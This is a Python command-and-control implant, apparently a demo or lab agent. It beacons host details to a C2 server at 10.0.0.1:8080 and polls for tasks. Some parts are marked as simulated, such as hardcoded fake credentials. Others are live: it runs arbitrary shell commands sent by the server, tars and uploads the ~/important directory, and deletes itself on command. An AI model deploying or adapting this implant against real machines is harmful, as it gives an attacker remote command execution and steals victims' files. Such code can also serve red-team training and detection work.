#!/usr/bin/env python3
import os
import time
import json
import socket
import requests
import subprocess
import tarfile

C2_SERVER = 'http://10.0.0.1:8080' 
BEACON_INTERVAL = 10

def get_host_info():
    hostname = socket.gethostname()
    username = os.getenv("USER") or "unknown"
    ip_addrs = subprocess.getoutput("hostname -I").strip()
    processes = subprocess.getoutput("ps aux").split('\n')[:5]  # Sample few processes
    # Return a dict for beacon
    return {
        "hostname": hostname,
        "user": username,
        "ip": ip_addrs,
        "processes": processes,
        "domain": "demo.local"
    }

def run_recon():
    # Simulated recon command: get network interfaces and DNS config
    output = subprocess.getoutput("ip addr && cat /etc/resolv.conf")
    return output

def steal_creds():
    # Simulated stolen creds file content
    return "admin:password123\nuser1:user1pass"

def exfiltrate_data():
    # Simulated exfiltration: package some files (dummy here)
    data = "This is a dummy exfiltrate data content."
    return data

def post_data(endpoint, data, files=None):
    url = f"{C2_SERVER}/{endpoint}"
    headers = {"X-Victim-Id": socket.gethostname()}
    try:
        if files:
            r = requests.post(url, files=files, headers=headers, timeout=5)
        else:
            r = requests.post(url, json=data, headers=headers, timeout=5)
        return r.ok
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def get_task():
    headers = {"X-Victim-Id": socket.gethostname()} 
    try:
        r = requests.get(f"{C2_SERVER}/task", headers=headers, timeout=5)
        if r.ok:
            return r.text.strip()
    except Exception:
        pass
    return "sleep"

def exfiltrate_directory():
    archive_name = "/tmp/exfiltrate.tar.gz"
    dir_to_archive = os.path.expanduser("~/important")  # Change as needed

    with tarfile.open(archive_name, "w:gz") as tar:
        tar.add(dir_to_archive, arcname=os.path.basename(dir_to_archive))

    with open(archive_name, "rb") as f:
        data = f.read()

    return data, archive_name

def run_shell_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15)
        return output.decode(errors='ignore')
    except Exception as e:
        return f"Command error: {str(e)}"

def main():
    while True:
        host_info = get_host_info()
        
        post_data("beacon", host_info)

        task = get_task()

        if task == "recon":
            output = run_recon()
            post_data("beacon", {"recon_data": output})
        elif task == "steal_creds":
            creds = steal_creds()
            post_data("upload", data=None, files={'file': ('creds.txt', creds)})
        elif task == "exfil":
            data, filename = exfiltrate_directory()
            post_data("upload", data=None, files={'file': (os.path.basename(filename), data)})
        elif task.startswith("exec:"):
            cmd = task[len("exec:"):]
            output = run_shell_command(cmd)
            post_data("beacon", {"cmd_output": output})
        elif task == "kill":
            post_data("beacon", {"status": "terminating"})
            try:
                os.remove(__file__)  # Delete self
            except:
                pass
            exit(0)

        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    main()

